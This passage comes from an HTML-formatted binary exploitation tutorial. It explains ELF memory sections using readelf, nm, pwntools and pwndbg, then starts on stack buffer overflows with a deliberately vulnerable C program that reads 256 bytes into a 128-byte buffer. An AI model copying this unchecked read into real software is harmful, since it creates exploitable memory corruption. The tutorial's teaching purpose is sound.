&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">const&lt;/span> &lt;span style="color:#204a87;font-weight:bold">char&lt;/span> &lt;span style="color:#000">g_buf_const&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">32&lt;/span>&lt;span style="color:#000;font-weight:bold">]&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#4e9a06">&amp;#34;Hello, world&lt;/span>&lt;span style="color:#4e9a06">\n&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">int&lt;/span> &lt;span style="color:#000">main&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#204a87;font-weight:bold">void&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-weight:bold">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">char&lt;/span> &lt;span style="color:#000">l_buf&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">32&lt;/span>&lt;span style="color:#000;font-weight:bold">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">static&lt;/span> &lt;span style="color:#204a87;font-weight:bold">char&lt;/span> &lt;span style="color:#000">s_l_buf&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">32&lt;/span>&lt;span style="color:#000;font-weight:bold">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">char&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">*&lt;/span>&lt;span style="color:#000">heap_buf&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">malloc&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">32&lt;/span>&lt;span style="color:#000;font-weight:bold">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">free&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">heap_buf&lt;/span>&lt;span style="color:#000;font-weight:bold">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">return&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-weight:bold">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Check the common binary sections and symbols. Use the usual coomands (&lt;code>readelf -S&lt;/code>, &lt;code>nm&lt;/code>).
Observe in which section each variable is located and the section flags.&lt;/p>
&lt;pre>
$ readelf -S buffers
...
[16] .rodata PROGBITS &lt;b>0000000000402000&lt;/b> 00002000
0000000000000040 0000000000000000 &lt;b>A&lt;/b> 0 0 32
...
[24] .data PROGBITS &lt;b>0000000000404040&lt;/b> 00003040
0000000000000040 0000000000000000 &lt;b>WA&lt;/b> 0 0 32
[25] .bss NOBITS &lt;b>0000000000404080&lt;/b> 00003080
0000000000000060 0000000000000000 &lt;b>WA&lt;/b> 0 0 32
...
Key to Flags:
W (write), A (alloc), X (execute)
$ nm buffers
...
&lt;b>0000000000402020 R&lt;/b> g_buf_const
&lt;b>0000000000404060 D&lt;/b> g_buf_init_vals
&lt;b>00000000004040a0 B&lt;/b> g_buf_init_zero
Key to Flags:
R (symbol is read-only)
D (symbol in initialized data section)
B (symbol in BSS data section)
A lowercase flag means variable is not visible local (not visible outside the object)
&lt;/pre>
&lt;p>You can also inspect these programmatically using pwntools and the ELF class:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">from&lt;/span> &lt;span style="color:#000">pwn&lt;/span> &lt;span style="color:#204a87;font-weight:bold">import&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">*&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">elf&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">ELF&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;buffers&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">bss&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">elf&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">get_section_by_name&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;.bss&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">data&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">elf&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">get_section_by_name&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;.data&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">rodata&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">elf&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">get_section_by_name&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;.rodata&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">bss_addr&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">bss&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;sh_addr&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">data_addr&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">data&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;sh_addr&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">rodata_addr&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">rodata&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;sh_addr&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">bss_size&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">bss&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;sh_size&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">data_size&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">data&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;sh_size&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">rodata_size&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">rodata&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;sh_size&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># A (Alloc) = 1 &amp;lt;&amp;lt; 1 = 2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># W (Write) = 1 &amp;lt;&amp;lt; 0 = 1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">bss_flags&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">bss&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;sh_flags&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">data_flags&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">data&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;sh_flags&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">rodata_flags&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">rodata&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;sh_flags&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87">print&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;Section info:&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87">print&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;.bss: 0x&lt;/span>&lt;span style="color:#4e9a06">{:08x}&lt;/span>&lt;span style="color:#4e9a06">-0x&lt;/span>&lt;span style="color:#4e9a06">{:08x}&lt;/span>&lt;span style="color:#4e9a06">, &lt;/span>&lt;span style="color:#4e9a06">{}&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">format&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">bss_addr&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#000">bss_addr&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">+&lt;/span>&lt;span style="color:#000">bss_size&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#000">bss_flags&lt;/span>&lt;span style="color:#000;font-weight:bold">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87">print&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;.data: 0x&lt;/span>&lt;span style="color:#4e9a06">{:08x}&lt;/span>&lt;span style="color:#4e9a06">-0x&lt;/span>&lt;span style="color:#4e9a06">{:08x}&lt;/span>&lt;span style="color:#4e9a06">, &lt;/span>&lt;span style="color:#4e9a06">{}&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">format&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">data_addr&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#000">data_addr&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">+&lt;/span>&lt;span style="color:#000">data_size&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#000">data_flags&lt;/span>&lt;span style="color:#000;font-weight:bold">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87">print&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;.rodata: 0x&lt;/span>&lt;span style="color:#4e9a06">{:08x}&lt;/span>&lt;span style="color:#4e9a06">-0x&lt;/span>&lt;span style="color:#4e9a06">{:08x}&lt;/span>&lt;span style="color:#4e9a06">, &lt;/span>&lt;span style="color:#4e9a06">{}&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">format&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">rodata_addr&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#000">rodata_addr&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">+&lt;/span>&lt;span style="color:#000">rodata_size&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#000">rodata_flags&lt;/span>&lt;span style="color:#000;font-weight:bold">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87">print&lt;/span>&lt;span style="color:#000;font-weight:bold">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87">print&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;Variable info:&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87">print&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;g_buf_init_zero: 0x&lt;/span>&lt;span style="color:#4e9a06">{:08x}&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">format&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">elf&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">symbols&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">g_buf_init_zero&lt;/span>&lt;span style="color:#000;font-weight:bold">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87">print&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;g_buf_init_vals: 0x&lt;/span>&lt;span style="color:#4e9a06">{:08x}&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">format&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">elf&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">symbols&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">g_buf_init_vals&lt;/span>&lt;span style="color:#000;font-weight:bold">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87">print&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;g_buf_const: 0x&lt;/span>&lt;span style="color:#4e9a06">{:08x}&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">format&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">elf&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">symbols&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">g_buf_const&lt;/span>&lt;span style="color:#000;font-weight:bold">))&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Another handy utility is the &lt;code>vmmap&lt;/code> command in &lt;code>pwndbg&lt;/code> which shows all memory maps of the process at runtime:&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-gdb" data-lang="gdb">pwndbg&amp;gt; b main
pwngdb&amp;gt; run
pwndbg&amp;gt; vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
0x400000 0x401000 r--p 1000 0 /home/user/buffers
0x401000 0x402000 r-xp 1000 1000 /home/user/buffers
0x402000 0x403000 r--p 1000 2000 /home/user/buffers
0x403000 0x404000 r--p 1000 2000 /home/user/buffers
0x404000 0x405000 rw-p 1000 3000 /home/user/buffers
0x7ffff7dc9000 0x7ffff7dcb000 rw-p 2000 0
...
0x7ffffffdd000 0x7ffffffff000 rw-p 22000 0 [stack]
0xffffffffff600000 0xffffffffff601000 --xp 1000 0 [vsyscall]
&lt;/code>&lt;/pre>&lt;p>Non-static local variables and dynamically allocated buffers cannot be seen in the executable (they have meaning only at runtime, because they are allocated on the stack or heap in a function scope). The symbol names aren&amp;rsquo;t found anywhere in the binary, except if debug symbols are enabled (&lt;code>-g&lt;/code> flag).&lt;/p>
&lt;h2 id="stack-buffer-overflow">Stack buffer overflow&lt;/h2>
&lt;img src="./assets/stack_x86_64.png" width="600">
&lt;blockquote>
&lt;p>&lt;i> Note that this is the stack for a 64bit system and the first couple of function arguments are stored in registers (rdi, rsi, rdx, rcx, r8, and r9) and that&amp;rsquo;s why the images has &lt;code>arg_6&lt;/code> as the first argument. &lt;/i>&lt;/p>
&lt;/blockquote>
&lt;p>We should know by now that the stack serves multiple purposes:&lt;/p>
&lt;ul>
&lt;li>Passing function arguments from the caller to the callee&lt;/li>
&lt;li>Storing local variables for functions&lt;/li>
&lt;li>Temporarily saving register values before a call&lt;/li>
&lt;li>Saving the return address and old frame pointer&lt;/li>
&lt;/ul>
&lt;p>Even though, in an abstract sense, different buffers are separate from one another, ultimately they are just some regions of memory which do not have any intrinsic identification or associated size. To avoid this, most hight level languages use size metadata and bound checks to detect out of bounds accesses to the memory.&lt;/p>
&lt;p>But in our case, bounds are unchecked, therefore it is up to the programmer to code carefully. This includes checking for any overflows and using &lt;strong>safe functions&lt;/strong>. Unfortunately, many functions in the standard C library, particularly those which work with strings and read user input, are unsafe - nowadays, the compiler will issue warnings when encountering them.&lt;/p>
&lt;h3 id="buffer-size-and-offset-identification">Buffer size and offset identification&lt;/h3>
&lt;p>When trying to overflow a buffer on the stack we need to know the size and where the buffer is in memory relative to the saved return address (or some other control flow altering value/pointer).&lt;/p>
&lt;h4 id="static-analysis">Static Analysis&lt;/h4>
&lt;p>One way, for simple programs, you can do &lt;strong>static analysis&lt;/strong> and check some key points in the diassembled code.&lt;/p>
&lt;p>For example, this simple program (&lt;code>00-tutorial/simple_read&lt;/code>, run &lt;code>make simple_read&lt;/code> to compile):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">#include&lt;/span> &lt;span style="color:#8f5902;font-style:italic">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#8f5902;font-style:italic">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">int&lt;/span> &lt;span style="color:#000">main&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#204a87;font-weight:bold">void&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span> &lt;span style="color:#000;font-weight:bold">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">char&lt;/span> &lt;span style="color:#000">buf&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">128&lt;/span>&lt;span style="color:#000;font-weight:bold">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">fread&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">buf&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">1&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">256&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#000">stdin&lt;/span>&lt;span style="color:#000;font-weight:bold">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">return&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-weight:bold">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>generates the following assembly:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-nasm" data-lang="nasm">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">push&lt;/span> &lt;span style="color:#204a87">rbp&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#204a87">rbp&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span>&lt;span style="color:#204a87">rsp&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">sub&lt;/span> &lt;span style="color:#204a87">rsp&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">0x90&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#204a87">rax&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span>&lt;span style="color:#204a87;font-weight:bold">QWORD&lt;/span> &lt;span style="color:#000">PTR&lt;/span> &lt;span style="color:#204a87">fs&lt;/span>&lt;span style="color:#000;font-weight:bold">:&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">0x28&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#204a87;font-weight:bold">QWORD&lt;/span> &lt;span style="color:#000">PTR&lt;/span> &lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#204a87">rbp&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">-&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">0x8&lt;/span>&lt;span style="color:#000;font-weight:bold">],&lt;/span>&lt;span style="color:#204a87">rax&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">xor&lt;/span> &lt;span style="color:#204a87">eax&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span>&lt;span style="color:#204a87">eax&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a40000">#&lt;/span> &lt;span style="color:#204a87;font-weight:bold">import&lt;/span>&lt;span style="color:#000">ant&lt;/span> &lt;span style="color:#000">bit&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#204a87">rdx&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span>&lt;span style="color:#204a87;font-weight:bold">QWORD&lt;/span> &lt;span style="color:#000">PTR&lt;/span> &lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#000">rip&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">+&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">0x2ed6&lt;/span>&lt;span style="color:#000;font-weight:bold">]&lt;/span> &lt;span style="color:#a40000">#&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">4040&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">&amp;lt;&lt;/span>&lt;span style="color:#000">stdin@@GLIBC_2.2.5&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">lea&lt;/span> &lt;span style="color:#204a87">rax&lt;/span>&lt;span style="color:#000;font-weight:bold">,[&lt;/span>&lt;span style="color:#204a87">rbp&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">-&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">0x90&lt;/span>&lt;span style="color:#000;font-weight:bold">]&lt;/span> &lt;span style="color:#a40000">#&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">&amp;lt;-&lt;/span> &lt;span style="color:#000">stack&lt;/span> &lt;span style="color:#000">buffer&lt;/span> &lt;span style="color:#000">starts&lt;/span> &lt;span style="color:#000">at&lt;/span> &lt;span style="color:#204a87">rbp&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">-&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">0x90&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#204a87">rcx&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span>&lt;span style="color:#204a87">rdx&lt;/span> &lt;span style="color:#a40000">#&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">&amp;lt;-&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">4&lt;/span>&lt;span style="color:#000">th&lt;/span> &lt;span style="color:#000">argument&lt;/span> &lt;span style="color:#000">fo&lt;/span> &lt;span style="color:#000">fread&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#000">stdin&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#204a87">edx&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">0x100&lt;/span> &lt;span style="color:#a40000">#&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">&amp;lt;-&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">3&lt;/span>&lt;span style="color:#000">rd&lt;/span> &lt;span style="color:#000">argument&lt;/span> &lt;span style="color:#000">of&lt;/span> &lt;span style="color:#000">fread&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#000">number&lt;/span> &lt;span style="color:#000">of&lt;/span> &lt;span style="color:#000">elements&lt;/span> &lt;span style="color:#000">read&lt;/span>
